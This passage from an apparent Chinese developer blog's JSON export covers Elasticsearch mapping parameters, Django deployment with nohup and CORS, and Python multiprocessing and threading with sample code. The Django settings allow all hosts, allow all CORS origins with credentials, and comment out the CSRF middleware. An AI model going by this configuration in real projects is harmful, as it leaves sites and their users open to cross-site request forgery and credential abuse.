为了区别第一个字段和第二个字段，Abraham和Lincoln在索引中有一个间距，默认是100。例子如下，这是查询”Abraham Lincoln”是查不到的： 123456789101112131415PUT my_index/groups/1&#123; \"names\": [ \"John Abraham\", \"Lincoln Smith\"]&#125; GET my_index/groups/_search&#123; \"query\": &#123; \"match_phrase\": &#123; \"names\": &#123; \"query\": \"Abraham Lincoln\" &#125; &#125; &#125;&#125; 指定间距大于100可以查询到： 1234567891011GET my_index/groups/_search&#123; \"query\": &#123; \"match_phrase\": &#123; \"names\": &#123; \"query\": \"Abraham Lincoln\", \"slop\": 101 &#125; &#125; &#125;&#125; 在mapping中通过position_increment_gap参数指定间距： 12345678910111213PUT my_index&#123; \"mappings\": &#123; \"groups\": &#123; \"properties\": &#123; \"names\": &#123; \"type\": \"text\", \"position_increment_gap\": 0 &#125; &#125; &#125; &#125;&#125; 0x4.3.20 propertiesObject或者nested类型，下面还有嵌套类型，可以通过properties参数指定。 12345678910111213141516171819202122PUT my_index&#123; \"mappings\": &#123; \"my_type\": &#123; \"properties\": &#123; \"manager\": &#123; \"properties\": &#123; \"age\": &#123; \"type\": \"integer\" &#125;, \"name\": &#123; \"type\": \"text\" &#125; &#125; &#125;, \"employees\": &#123; \"type\": \"nested\", \"properties\": &#123; \"age\": &#123; \"type\": \"integer\" &#125;, \"name\": &#123; \"type\": \"text\" &#125; &#125; &#125; &#125; &#125; &#125;&#125; 对应的文档结构： 123456789101112131415161718PUT my_index/my_type/1 &#123; \"region\": \"US\", \"manager\": &#123; \"name\": \"Alice White\", \"age\": 30 &#125;, \"employees\": [ &#123; \"name\": \"John Smith\", \"age\": 34 &#125;, &#123; \"name\": \"Peter Brown\", \"age\": 26 &#125; ]&#125; 可以对manager.name、manager.age做搜索、聚合等操作。 1234567891011121314151617181920212223GET my_index/_search&#123; \"query\": &#123; \"match\": &#123; \"manager.name\": \"Alice White\" &#125; &#125;, \"aggs\": &#123; \"Employees\": &#123; \"nested\": &#123; \"path\": \"employees\" &#125;, \"aggs\": &#123; \"Employee Ages\": &#123; \"histogram\": &#123; \"field\": \"employees.age\", \"interval\": 5 &#125; &#125; &#125; &#125; &#125;&#125; 0x4.3.21 search_analyzer大多数情况下索引和搜索的时候应该指定相同的分析器，确保query解析以后和索引中的词项一致。但是有时候也需要指定不同的分析器，例如使用edge_ngram过滤器实现自动补全。 默认情况下查询会使用analyzer属性指定的分析器，但也可以被search_analyzer覆盖。例子： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152PUT my_index&#123; \"settings\": &#123; \"analysis\": &#123; \"filter\": &#123; \"autocomplete_filter\": &#123; \"type\": \"edge_ngram\", \"min_gram\": 1, \"max_gram\": 20 &#125; &#125;, \"analyzer\": &#123; \"autocomplete\": &#123; \"type\": \"custom\", \"tokenizer\": \"standard\", \"filter\": [ \"lowercase\", \"autocomplete_filter\" ] &#125; &#125; &#125; &#125;, \"mappings\": &#123; \"my_type\": &#123; \"properties\": &#123; \"text\": &#123; \"type\": \"text\", \"analyzer\": \"autocomplete\", \"search_analyzer\": \"standard\" &#125; &#125; &#125; &#125;&#125; PUT my_index/my_type/1&#123; \"text\": \"Quick Brown Fox\" &#125; GET my_index/_search&#123; \"query\": &#123; \"match\": &#123; \"text\": &#123; \"query\": \"Quick Br\", \"operator\": \"and\" &#125; &#125; &#125;&#125; 0x4.3.22 similaritysimilarity参数用于指定文档评分模型，参数有三个： BM25 ：ES和Lucene默认的评分模型classic ：TF/IDF评分boolean：布尔模型评分例子： 1234567891011121314151617181920PUT my_index&#123; \"mappings\": &#123; \"my_type\": &#123; \"properties\": &#123; \"default_field\": &#123; \"type\": \"text\" &#125;, \"classic_field\": &#123; \"type\": \"text\", \"similarity\": \"classic\" &#125;, \"boolean_sim_field\": &#123; \"type\": \"text\", \"similarity\": \"boolean\" &#125; &#125; &#125; &#125;&#125; default_field自动使用BM25评分模型，classic_field使用TF/IDF经典评分模型，boolean_sim_field使用布尔评分模型。 0x4.3.23 store默认情况下，自动是被索引的也可以搜索，但是不存储，这也没关系，因为_source字段里面保存了一份原始文档。在某些情况下，store参数有意义，比如一个文档里面有title、date和超大的content字段，如果只想获取title和date，可以这样： 1234567891011121314151617181920212223242526272829303132PUT my_index&#123; \"mappings\": &#123; \"my_type\": &#123; \"properties\": &#123; \"title\": &#123; \"type\": \"text\", \"store\": true &#125;, \"date\": &#123; \"type\": \"date\", \"store\": true &#125;, \"content\": &#123; \"type\": \"text\" &#125; &#125; &#125; &#125;&#125; PUT my_index/my_type/1&#123; \"title\": \"Some short title\", \"date\": \"2015-01-01\", \"content\": \"A very long content field...\"&#125; GET my_index/_search&#123; \"stored_fields\": [ \"title\", \"date\" ] &#125; 查询结果： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&#123; \"took\": 1, \"timed_out\": false, \"_shards\": &#123; \"total\": 5, \"successful\": 5, \"failed\": 0 &#125;, \"hits\": &#123; \"total\": 1, \"max_score\": 1, \"hits\": [ &#123; \"_index\": \"my_index\", \"_type\": \"my_type\", \"_id\": \"1\", \"_score\": 1, \"fields\": &#123; \"date\": [ \"2015-01-01T00:00:00.000Z\" ], \"title\": [ \"Some short title\" ] &#125; &#125; ] &#125;&#125;``` Stored fields返回的总是数组，如果想返回原始字段，还是要从_source中取。**0x4.3.24 term_vector** 词向量包含了文本被解析以后的以下信息：词项集合词项位置词项的起始字符映射到原始文档中的位置。term_vector参数有以下取值：参数取值 含义no 默认值，不存储词向量yes 只存储词项集合with_positions 存储词项和词项位置with_offsets 词项和字符偏移位置with_positions_offsets 存储词项、词项位置、字符偏移位置例子：```bashPUT my_index&#123; \"mappings\": &#123; \"my_type\": &#123; \"properties\": &#123; \"text\": &#123; \"type\": \"text\", \"term_vector\": \"with_positions_offsets\" &#125; &#125; &#125; &#125;&#125; PUT my_index/my_type/1&#123; \"text\": \"Quick brown fox\"&#125; GET my_index/_search&#123; \"query\": &#123; \"match\": &#123; \"text\": \"brown fox\" &#125; &#125;, \"highlight\": &#123; \"fields\": &#123; \"text\": &#123;&#125; &#125; &#125;&#125; 0x5 elasticsearch操作参考文章:http://wiki.jikexueyuan.com/project/elasticsearch-definitive-guide-cn/http://www.shixinke.com/ES Mapping、字段类型Field type详解https://blog.csdn.net/ZYC88888/article/details/83059040","categories":[{"name":"开发","slug":"开发","permalink":"https://blog.cfyqy.com/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"数据检索","slug":"数据检索","permalink":"https://blog.cfyqy.com/tags/%E6%95%B0%E6%8D%AE%E6%A3%80%E7%B4%A2/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://blog.cfyqy.com/tags/elasticsearch/"}],"author":"ye1s"},{"title":"django运行环境的搭建","slug":"django运行环境的搭建","date":"2019-06-08T11:16:00.000Z","updated":"2020-04-13T08:13:26.738Z","comments":true,"path":"article/1d63f3f6.html","link":"","permalink":"https://blog.cfyqy.com/article/1d63f3f6.html","excerpt":"django运行环境搭建","text":"django运行环境搭建 0x1manage.py0x1.1运行外部地址访问修改setting.py文件 12DEBUG = False # 后期发布的时候DEBUG建议修改为FalseALLOWED_HOSTS = [\"*\"] #允许外部的地址访问 0x1.2后台运行manage.py文件centos后台运行Python 1nohup python3 -u manage.py runserver 0.0.0.0:8000 &gt; /root/IPSearch/log/access.log 2&gt;&amp;1 &amp; *含义解释： 12345678910nohup 不挂起的意思python test.py python运行test.py文件-u 代表程序不启用缓存，也就是把输出直接放到log中，没这个参数的话，log文件的生成会有延迟&gt; test.log 将输出日志保存到这个log中2&gt;1 2与&gt;结合代表错误重定向，而1则代表错误重定向到一个文件1，而不代表标准输出； 2&gt;&amp;1 换成2&gt;&amp;1，&amp;与1结合就代表标准输出了，就变成错误重定向到标准输出.&amp; 最后一个&amp; ，代表该命令在后台执行*命令运行后会有提示，示例：[1] 2880代表进程2880中运行。 查看nohub命令下运行的所有后台进程： 1jobs 查看后台运行的所有进程： 1ps -aux 查看后台运行的所有python 进程： 123ps aux |grep python或者ps -ef | grep python 删除进程 12kill -9 [进程id]-9 的意思是强制删除 0x2设置跨域请求设置跨域请求的时候要注意域名，协议，端口不同。浏览器执行javascript脚本时，不会被执行。安装 django-cors-headers 1django-cors-headers setting.py中添加信息 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647INSTALLED_APPS = [ ... 'corsheaders'， ... ] # 添加中间件MIDDLEWARE = [ 'django.middleware.security.SecurityMiddleware',# 默认 'django.contrib.sessions.middleware.SessionMiddleware', # 默认 # 注意顺序，即在上一个的下面 'corsheaders.middleware.CorsMiddleware',# 新增 ✔ 'django.middleware.common.CommonMiddleware', # 'django.middleware.csrf.CsrfViewMiddleware',# 默认 'django.contrib.auth.middleware.AuthenticationMiddleware',# 默认 'django.contrib.messages.middleware.MessageMiddleware', # 默认 'django.middleware.clickjacking.XFrameOptionsMiddleware',# 默认 'django.middleware.common.CommonMiddleware',# 默认]# 跨域增加忽略CORS_ORIGIN_ALLOW_ALL = TrueCORS_ALLOW_CREDENTIALS = TrueCORS_ALLOW_METHODS = ( 'DELETE', 'GET', 'OPTIONS', 'PATCH', 'POST', 'PUT',)CORS_ALLOW_HEADERS = ( 'accept', 'accept-encoding', 'authorization', 'content-type', 'dnt', 'origin', 'user-agent', 'x-csrftoken', 'x-requested-with',)#允许外部地址访问ALLOWED_HOSTS = ['*'] 0x3uwsig+nginx","categories":[{"name":"开发","slug":"开发","permalink":"https://blog.cfyqy.com/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"django","slug":"django","permalink":"https://blog.cfyqy.com/tags/django/"},{"name":"python","slug":"python","permalink":"https://blog.cfyqy.com/tags/python/"}],"author":"ye1s"},{"title":"python进程、线程和协程","slug":"ython多进程","date":"2019-06-02T02:05:00.000Z","updated":"2020-04-13T08:25:55.438Z","comments":true,"path":"article/6a6101d4.html","link":"","permalink":"https://blog.cfyqy.com/article/6a6101d4.html","excerpt":"","text":"0x1进程进程（process）是正在运行的程序的实例，但一个程序可能会产生多个进程。比如，打开 Chrome 浏览器程序，它可能会产生多个进程，主程序需要一个进程，一个网页标签需要一个进程，一个插件也需要一个进程，等等。 进程时一个具有一定功能的程序在一个数据集上的一次动态执行过程。进程由程序，数据集合和进程控制块三部分组成。 程序用于描述进程要完成的功能，是控制进程执行的指令集； 数据集合是程序在执行时需要的数据和工作区； 程序控制块（PCB）包含程序的描述信息和控制信息，是进程存在的唯一标志。 0x1.1fork()在介绍 Python 的进程编程之前，让我们先看看 Unix/Linux 中的 fork 函数。在 Unix/Linux 系统中，fork 函数被用于创建进程。这个函数很特殊，对于普通的函数，调用它一次，返回一次，但是调用 fork 一次，它返回两次。事实上，fork 函数创建了新的进程，我们把它称为子进程，子进程几乎是当前进程（即父进程）的一个拷贝：它会复制父进程的代码段，堆栈段和数据段。 对于父进程，fork 函数返回了子进程的进程号 pid，对于子进程，fork 函数则返回 0，这也是 fork 函数返回两次的原因，根据返回值，我们可以判断进程是父进程还是子进程。 下面我们看一段 C 代码，它展示了 fork 的基本使用： 12345678910111213141516171819#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;int main(int argc, char const *argv[])&#123; int pid; pid = fork(); // 使用 fork 函数 if (pid &lt; 0) &#123; printf(\"Fail to create process\\n\"); &#125; else if (pid == 0) &#123; printf(\"I am child process (%d) and my parent is (%d)\\n\", getpid(), getppid()); &#125; else &#123; printf(\"I (%d) just created a child process (%d)\\n\", getpid(), pid); &#125; return 0;&#125; 其中，getpid 用于获取当前进程号，getppid 用于获取父进程号。 事实上，Python 的 os 模块包含了普遍的操作系统功能，该模块也提供了 fork 函数，把上面的代码改成用 Python 来实现，如下： 12345678910import ospid = os.fork()if pid &lt; 0: print 'Fail to create process'elif pid == 0: print 'I am child process (%s) and my parent is (%s).' % (os.getpid(), os.getppid())else: print 'I (%s) just created a child process (%s).' % (os.getpid(), pid) 运行上面的代码，产生如下输出： 12I (86645) just created a child process (86646).I am child process (86646) and my parent is (86645). 需要注意的是，虽然子进程复制了父进程的代码段和数据段等，但是一旦子进程开始运行，子进程和父进程就是相互独立的，它们之间不再共享任何数据。 0x1.2多进程Python 提供了一个 multiprocessing 模块，利用它，我们可以来编写跨平台的多进程程序，但需要注意的是 multiprocessing 在 Windows 和 Linux 平台的不一致性：一样的代码在 Windows 和 Linux 下运行的结果可能不同。因为 Windows 的进程模型和 Linux 不一样，Windows 下没有 fork。 我们先来看一个简单的例子，该例子演示了在主进程中启动一个子进程，并等待其结束，代码如下： 1234567891011121314import osfrom multiprocessing import Process# 子进程要执行的代码def child_proc(name): print 'Run child process %s (%s)...' % (name, os.getpid())if __name__ == '__main__': print 'Parent process %s.' % os.getpid() p = Process(target=child_proc, args=('test',)) print 'Process will start.' p.start() p.join() print 'Process end.' 在上面的代码中，我们从 multiprocessing 模块引入了 Process，Process 是一个用于创建进程对象的类，其中，target 指定了进程要执行的函数，args 指定了参数。在创建了进程实例 p 之后，我们调用 start 方法开始执行该子进程，接着，我们又调用了 join 方法，该方法用于阻塞子进程以外的所有进程（这里指父进程），当子进程执行完毕后，父进程才会继续执行，它通常用于进程间的同步。 可以看到，用上面这种方式来创建进程比直接使用 fork 更简单易懂。现在，让我们看下输出结果： 1234Parent process 7170.Process will start.Run child process test (10075)...Process end. 0x1.3multiprocessing 与平台有关1234567891011121314import randomimport osfrom multiprocessing import Processnum = random.randint(0, 100)def show_num(): print(\"pid:&#123;&#125;, num is &#123;&#125;\".format(os.getpid(), num))if __name__ == \"__main__\": print(\"pid:&#123;&#125;, num is &#123;&#125;\".format(os.getpid(), num)) p = Process(target=show_num) p.start() p.join() 在 Windows 下运行以上代码，输出的结果如下（你得到不一样的结果也是对的）： 12pid:6504, num is 25pid:6880, num is 6 我们发现，num 的值是不一样的！ 在 Linux 下运行以上代码，可以看到 num 的值是一样的： 12pid:11747, num is 13pid:11748, num is 13 0x1.4进程池Pool在上面，我们只是创建了一个进程，如果要创建多个进程呢？Python 提供了进程池的方式，让我们批量创建子进程，让我们看一个简单的示例： 1234567891011121314151617import os, timefrom multiprocessing import Pooldef foo(x): print 'Run task %s (pid:%s)...' % (x, os.getpid()) time.sleep(2) print 'Task %s result is: %s' % (x, x * x)if __name__ == '__main__': print 'Parent process %s.' % os.getpid() p = Pool(4) # 设置进程数 for i in range(5): p.apply_async(foo, args=(i,)) # 设置每个进程要执行的函数和参数 print 'Waiting for all subprocesses done...' p.close() p.join() print 'All subprocesses done.' 在上面的代码中，Pool 用于生成进程池，对 Pool 对象调用 apply_async 方法可以使每个进程异步执行任务，也就说不用等上一个任务执行完才执行下一个任务，close 方法用于关闭进程池，确保没有新的进程加入，join 方法会等待所有子进程执行完毕。 看看执行结果： 12345678910111213Parent process 7170.Run task 1 (pid:10320)...Run task 0 (pid:10319)...Run task 3 (pid:10322)...Run task 2 (pid:10321)...Waiting for all subprocesses done...Task 1 result is: 1Task 0 result is: 0Run task 4 (pid:10320)...Task 3 result is: 9Task 2 result is: 4Task 4 result is: 16All subprocesses done. 0x1.5进程间通信每个进程各自有不同的用户地址空间,任何一个进程的全局变量在另一个进程中都看不到，所以进程之间要交换数据必须通过内核,在内核中开辟一块缓冲区,进程A把数据从用户空间拷到内核缓冲区,进程B再从内核缓冲区把数据读走,内核提供的这种机制称为进程间通信。假如创建了多个进程，那么进程间的通信是必不可少的。 Python提供了多种进程通信的方式，其中以Queue和Pipe用得最多。下面分别介绍这两种模式 0x1.5.1QueueQueue是一种多进程安全的队列。实现多进程间的通信有两种方法： put() 用于向队列中加入数据。有两个属性：blocked和timeout。blocked为true时（默认为True）且timeout为正值时，如果当队列已满会阻塞timeout时间，在这个时间内如果队列有空位会加入，如果超过时间仍然没有空位会抛出Queue.Full异常。 get() 用于从队列中获取一个数据并将其从队列中删除。有两个属性：blocked和timeout。blocked为true（默认为True）且timeout为正值时，如果当前队列为空会阻塞timeout时间，在这个时间内如果队列有新数据会获取，如果超过时间仍然没有新数据会抛出Queue.Empty异常。 下面以队列（Queue）为例，在父进程中创建两个子进程，一个往队列写数据，一个从对列读数据，代码如下： 12345678910111213141516171819202122232425262728293031323334353637import timeimport osfrom multiprocessing import Pool,Queue,Processdef write_task(q): try: n=1 while n&lt;5: print \"write,%d\"%n q.put(n) time.sleep(1) n+=1 except BaseException: print \"write_task error\" finally: print \"write_task end\"def read_task(q): try: n=1 while n&lt;5: print \"read,%d\"%q.get() n+=1 except BaseException: print \"read_task error\" finally: print \"read_task end\"if __name__==\"__main__\": q=Queue() pw=Process(target=write_task,args=(q,)) pr=Process(target=read_task,args=(q,)) pw.start() pr.start() pw.join() pr.join() print \"DONE\" 执行结果如下： 1234567891011write, 1read, 1write, 2read, 2write, 3read, 3write, 4read, 4write_task endread_task endDONE 0x1.5.2PipePipe与Queue不同之处在于Pipe是用于两个进程之间的通信。就像进程位于一根水管的两端。让我们看看Pipe官方文档的描述： Returns a pair (conn1, conn2) of Connection objects representing the ends of a pipe. Piep返回conn1和conn2代表水管的两端。Pipe还有一个参数duplex（adj. 二倍的，双重的 n. 双工；占两层楼的公寓套房），默认为True。当duplex为True时，开启双工模式，此时水管的两边都可以进行收发。当duplex为False，那么conn1只负责接受信息，conn2只负责发送信息。conn通过send()和recv()来发送和接受信息。值得注意的是，如果管道中没有信息可接受，recv()会一直阻塞直到管道关闭（任意一端进程接结束则管道关闭）。 123456789101112131415161718192021222324from multiprocessing import Process,Pipeimport osdef put_data(p,nums): print('现在的进程编号为：%s，这个一个send进程' % os.getpid()) for num in nums: p.send(num) print('%s已经放入管道中啦！' % num)def get_data(p): print('现在的进程编号为：%s，这个一个recv进程' % os.getpid()) while True: print('已经从管道中获取%s并从中删除' % p.recv())if __name__ == '__main__': p = Pipe(duplex=False) # 此时Pipe[1]即是Pipe返回的conn2 p1 = Process(target=put_data,args=(p[1],['1','2','3'],)) # 此时Pipe[0]即是Pipe返回的conn1 p3 = Process(target=get_data,args=(p[0],)) p1.start() p3.start() p1.join() p3.terminate() 让我们看一下输出结果 12345678现在的进程编号为：9868，这个一个recv进程现在的进程编号为：9072，这个一个send进程1已经放入管道中啦！已经从管道中获取1,并从中删除2已经放入管道中啦！已经从管道中获取2并从中删除3已经放入管道中啦！已经从管道中获取3并从中删除 0x1.5.3Array1234567891011121314from multiprocessing import Processfrom multiprocessing import Arraydef func(i, ar): ar[i] = i for item in ar: print(item) print(\"------\")if __name__=='__main__': ar = Array('i', 5) for i in range(5): p = Process(target=func, args=(i, ar,)) p.start() p.join() Array的局限性在于受制于数组的特性，即需要指定数据类型且长度固定 1234567# 数据类型对照表'c': ctypes.c_char, 'u': ctypes.c_wchar,'b': ctypes.c_byte, 'B': ctypes.c_ubyte,'h': ctypes.c_short, 'H': ctypes.c_ushort,'i': ctypes.c_int, 'I': ctypes.c_uint,'l': ctypes.c_long, 'L': ctypes.c_ulong,'f': ctypes.c_float, 'd': ctypes.c_double 0x1.5.4manage.dict()12345678910111213141516171819202122232425262728#coding:utf-8from multiprocessing import Process, Manager# 每个子进程执行的函数# 参数中，传递了一个用于多进程之间数据共享的特殊字典def func(i, d): d[i] = i + 100 print(d.values())if __name__=='__main__': # 在主进程中创建特殊字典 m = Manager() d = m.dict() for i in range(5): # 让子进程去修改主进程的特殊字典 p = Process(target=func, args=(i, d)) p.start() p.join()output:[101][100, 101][100, 101, 102][100, 101, 102, 103][100, 101, 102, 103, 104] 0x2线程线程（thread）是进程（process）中的一个实体，一个进程至少包含一个线程。比如，对于视频播放器，显示视频用一个线程，播放音频用另一个线程。如果我们把进程看成一个容器，则线程是此容器的工作单位。 进程和线程的区别主要有： 进程之间是相互独立的，多进程中，同一个变量，各自有一份拷贝存在于每个进程中，但互不影响；而同一个进程的多个线程是内存共享的，所有变量都由所有线程共享； 由于进程间是独立的，因此一个进程的崩溃不会影响到其他进程；而线程是包含在进程之内的，线程的崩溃就会引发进程的崩溃，继而导致同一进程内的其他线程也奔溃； 线程的生命周期由run方法决定，当run方法结束时线程死亡。可以通过继承Thread，重写run方法改变Thread的功能，最后还是通过start()方法开线程。 123456789from threading import Threadclass MyThread(Thread): def run(self): print('i am sorry')if __name__ == '__main__': t = MyThread() t.start() 通过args参数以一个元组的方式给线程中的函数传参。 12345678from threading import Threaddef sorry(name): print('i am sorry',name)if __name__ == '__main__': t = Thread(target=sorry,args=('mike',)) t.start() 0x2.1threding模块简介threding模块的类 对象 描述 Thread 表示一个执行线程的对象 Lock 锁对象 RLock 可重入锁对象，使单一线程可以（再次）获得已持有的锁（递归锁） Condition 条件变量对象，使得一个线程等待另外一个线程满足特定的条件，比如改变状态或者某个数据值 Event 条件变量的通用版本，任意数量的线程等待某个事件的发生，在该事件发生后所有的线程都将被激活 Semaphore 为线程间的有限资源提供一个计数器，如果没有可用资源时会被阻塞 BoundedSemaphore 于Semaphore相似，不过它不允许超过初始值 Timer 于Thread类似，不过它要在运行前等待一定时间 Barrier 创建一个障碍，必须达到指定数量的线程后才可以继续 0x2.2Thread类0x2.2.1使用方法Thread是线程类，有两种使用方法，直接传入要运行的方法或从Thread继承并覆盖run()：方法一：将要执行的方法作为参数传给Thread的构造方法 12345678910111213#coding:utf-8import threadingimport timedef action(arg): time.sleep(1) print 'the arg is:%s\\r' %argfor i in xrange(4): t =threading.Thread(target=action,args=(i,)) t.start()print 'main thread end!' 方法二：从Thread继承，并重写run() 12345678910111213141516#coding:utf-8import threadingimport timeclass MyThread(threading.Thread): def __init__(self,arg): super(MyThread, self).__init__()#注意：一定要显式的调用父类的初始化函数。 self.arg=arg def run(self):#定义每个线程要运行的函数 time.sleep(1) print 'the arg is:%s\\r' % self.argfor i in xrange(4): t =MyThread(i) t.start()print 'main thread end!' 构造方法：Thread(group=None, target=None, name=None, args=(), kwargs={}) group: 线程组，目前还没有实现，库引用中提示必须是None； target: 要执行的方法； name: 线程名； args/kwargs: 要传入方法的参数。 实例方法： isAlive(): 返回线程是否在运行。正在运行指启动后、终止前。 get/setName(name): 获取/设置线程名。 start(): 线程准备就绪，等待CPU调度 is/setDaemon(bool): 获取/设置是后台线程（默认前台线程（False））。（在start之前设置） 如果是后台线程，主线程执行过程中，后台线程也在进行，主线程执行完毕后，后台线程不论成功与否，主线程和后台线程均停止。 如果是前台线程，主线程执行过程中，前台线程也在进行，主线程执行完毕后，等待前台线程也执行完成后，程序停止 start(): 启动线程。 join([timeout]): 阻塞当前上下文环境的线程，直到调用此方法的线程终止或到达指定的timeout（可选参数）。 0x2.2.2setDeamon与join使用例子一(未设置setDeamon)： 123456789101112131415161718192021222324252627282930313233# coding:utf-8import threadingimport timedef action(arg): time.sleep(1) print 'sub thread start! the thread name is:%s\\r' % threading.currentThread().getName() print 'the arg is:%s\\r' %arg time.sleep(1)for i in xrange(4): t =threading.Thread(target=action,args=(i,)) t.start()print 'main_thread end!'output:main_thread end!sub thread start!the thread name is:Thread-3the arg is:2sub thread start!the thread name is:Thread-2sub thread start!the thread name is:Thread-1the arg is:1the arg is:0sub thread start!the thread name is:Thread-4the arg is:3[Finished in 2.2s] 验证了serDeamon(False)(默认)前台线程，主线程执行过程中，前台线程也在进行，主线程执行完毕后，等待前台线程也执行完成后，主线程停止。 使用例子二（setDeamon=True） 12345678910111213141516171819# coding:utf-8import threadingimport timedef action(arg): time.sleep(1) print 'sub thread start!the thread name is:%s\\r' % threading.currentThread().getName() print 'the arg is:%s\\r' %arg time.sleep(1)for i in xrange(4): t =threading.Thread(target=action,args=(i,)) t.setDaemon(True)#设置线程为后台线程 t.start()print 'main_thread end!'output:main_thread end! 验证了serDeamon(True)后台线程，主线程执行过程中，后台线程也在进行，主线程执行完毕后，后台线程不论成功与否，主、后台线程均停止。 使用例子三（设置join） 1234567891011121314151617181920212223242526272829303132333435#coding:utf-8import threadingimport timedef action(arg): time.sleep(1) print 'sub thread start!the thread name is:%s ' % threading.currentThread().getName() print 'the arg is:%s ' %arg time.sleep(1)thread_list = [] #线程存放列表for i in xrange(4): t =threading.Thread(target=action,args=(i,)) t.setDaemon(True) thread_list.append(t)for t in thread_list: t.start()for t in thread_list: t.join()output:sub thread start!the thread name is:Thread-2 sub thread start!the thread name is:Thread-1the arg is:1 the arg is:0sub thread start!the thread name is:Thread-4 sub thread start!the thread name is:Thread-3the arg is:2the arg is:3[Finished in 2.2s]设置join之后，主线程等待子线程全部执行完成后或者子线程超时后，主线程才结束 验证了 join()阻塞当前上下文环境的线程，直到调用此方法的线程终止或到达指定的timeout，即使设置了setDeamon（True）主线程依然要等待子线程结束。 使用例子四（join不妥当的用法，使多线程编程顺序执行） 1234567891011121314151617181920212223242526272829303132#coding:utf-8import threadingimport timedef action(arg): time.sleep(1) print 'sub thread start!the thread name is:%s ' % threading.currentThread().getName() print 'the arg is:%s ' %arg time.sleep(1)for i in xrange(4): t =threading.Thread(target=action,args=(i,)) t.setDaemon(True) t.start() t.join()print 'main_thread end!'ouput:sub thread start!the thread name is:Thread-1the arg is:0sub thread start!the thread name is:Thread-2the arg is:1sub thread start!the thread name is:Thread-3the arg is:2sub thread start!the thread name is:Thread-4the arg is:3main_thread end![Finished in 8.2s]可以看出此时，程序只能顺序执行，每个线程都被上一个线程的join阻塞，使得“多线程”失去了多线程意义。 0x2.3Lock、Rlock类 由于线程之间随机调度：某线程可能在执行n条后，CPU接着执行其他线程。为了多个线程同时操作一个内存中的资源时不产生混乱，我们使用锁。 Lock（指令锁）是可用的最低级的同步指令。Lock处于锁定状态时，不被特定的线程拥有。Lock包含两种状态——锁定和非锁定，以及两个基本的方法。 可以认为Lock有一个锁定池，当线程请求锁定时，将线程至于池中，直到获得锁定后出池。池中的线程处于状态图中的同步阻塞状态。 RLock（可重入锁）是一个可以被同一个线程请求多次的同步指令。RLock使用了“拥有的线程”和“递归等级”的概念，处于锁定状态时，RLock被某个线程拥有。拥有RLock的线程可以再次调用acquire()，释放锁时需要调用release()相同次数。 可以认为RLock包含一个锁定池和一个初始值为0的计数器，每次成功调用 acquire()/release()，计数器将+1/-1，为0时锁处于未锁定状态。 简言之：Lock属于全局，Rlock属于线程。 构造方法：Lock()，Rlock（）,推荐使用Rlock() 实例方法： acquire([timeout]): 尝试获得锁定。使线程进入同步阻塞状态。 release(): 释放锁。使用前线程必须已获得锁定，否则将抛出异常。 由于同一个进程之间的线程是内存共享的，所以当多个线程对同一个变量进行修改的时候，就会得到意想不到的结果。 让我们先看一个简单的例子： 1234567891011121314151617181920212223from threading import Thread, current_threadnum = 0def calc(): global num print 'thread %s is running...' % current_thread().name for _ in xrange(10000): num += 1 print 'thread %s ended.' % current_thread().nameif __name__ == '__main__': print 'thread %s is running...' % current_thread().name threads = [] for i in range(5): threads.append(Thread(target=calc)) threads[i].start() for i in range(5): threads[i].join() print 'global num: %d' % num print 'thread %s ended.' % current_thread().name 在上面的代码中，我们创建了 5 个线程，每个线程对全局变量 num 进行 10000 次的 加 1 操作，这里之所以要循环 10000 次，是为了延长单个线程的执行时间，使线程执行时能出现中断切换的情况。现在问题来了，当这 5 个线程执行完毕时，全局变量的值是多少呢？是 50000 吗？ 让我们看下执行结果： 12345678910111213thread MainThread is running...thread Thread-34 is running...thread Thread-34 ended.thread Thread-35 is running...thread Thread-36 is running...thread Thread-37 is running...thread Thread-38 is running...thread Thread-35 ended.thread Thread-38 ended.thread Thread-36 ended.thread Thread-37 ended.global num: 30668thread MainThread ended. 我们发现 num 的值是 30668，事实上，num 的值是不确定的，你再运行一遍，会发现结果变了。 原因是因为 num += 1 不是一个原子操作，也就是说它在执行时被分成若干步： 计算 num + 1，存入临时变量 tmp 中；将 tmp 的值赋给 num.由于线程是交替运行的，线程在执行时可能中断，就会导致其他线程读到一个脏值。 为了保证计算的准确性，我们就需要给 num += 1 这个操作加上锁。当某个线程开始执行这个操作时，由于该线程获得了锁，因此其他线程不能同时执行该操作，只能等待，直到锁被释放，这样就可以避免修改的冲突。创建一个锁可以通过 threading.Lock() 来实现，代码如下： 1234567891011121314151617181920212223242526from threading import Thread, current_thread, Locknum = 0lock = Lock()def calc(): global num print 'thread %s is running...' % current_thread().name for _ in xrange(10000): lock.acquire() # 获取锁 num += 1 lock.release() # 释放锁 print 'thread %s ended.' % current_thread().nameif __name__ == '__main__': print 'thread %s is running...' % current_thread().name threads = [] for i in range(5): threads.append(Thread(target=calc)) threads[i].start() for i in range(5): threads[i].join() print 'global num: %d' % num print 'thread %s ended.' % current_thread().name 让我们看下执行结果： 12345678910111213thread MainThread is running...thread Thread-44 is running...thread Thread-45 is running...thread Thread-46 is running...thread Thread-47 is running...thread Thread-48 is running...thread Thread-45 ended.thread Thread-47 ended.thread Thread-48 ended.thread Thread-46 ended.thread Thread-44 ended.global num: 50000thread MainThread ended. Lock对比Rlock 1234567891011121314151617#coding:utf-8 import threadinglock = threading.Lock() #Lock对象lock.acquire()lock.acquire() #产生了死锁。lock.release()lock.release()print lock.acquire() import threadingrLock = threading.RLock() #RLock对象rLock.acquire()rLock.acquire() #在同一线程内，程序不会堵塞。rLock.release()rLock.release() 0x2.4Condition类 Condition（条件变量）通常与一个锁关联。需要在多个Contidion中共享一个锁时，可以传递一个Lock/RLock实例给构造方法，否则它将自己生成一个RLock实例。 可以认为，除了Lock带有的锁定池外，Condition还包含一个等待池，池中的线程处于等待阻塞状态，直到另一个线程调用notify()/notifyAll()通知；得到通知后线程进入锁定池等待锁定。 构造方法：Condition([lock/rlock]) 实例方法： acquire([timeout])/release(): 调用关联的锁的相应方法。 wait([timeout]): 调用这个方法将使线程进入Condition的等待池等待通知，并释放锁。使用前线程必须已获得锁定，否则将抛出异常。 notify(): 